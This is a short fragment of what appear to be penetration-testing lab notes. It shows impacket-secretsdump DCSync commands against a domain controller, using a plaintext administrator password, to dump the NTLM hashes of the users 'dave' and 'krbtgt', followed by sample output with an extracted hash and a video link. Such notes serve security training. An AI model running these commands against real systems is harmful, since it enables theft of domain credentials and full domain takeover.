impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.166.70


# Output
...
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
# This is the hash: 08d7a47a6f9f66b97b1bae4178747494
...
```



















## Resources

- <https://www.youtube.com/playlist?list=PL3B8L-z5QU-Z0bWmjwgUSLGTzm1k_kVZo>








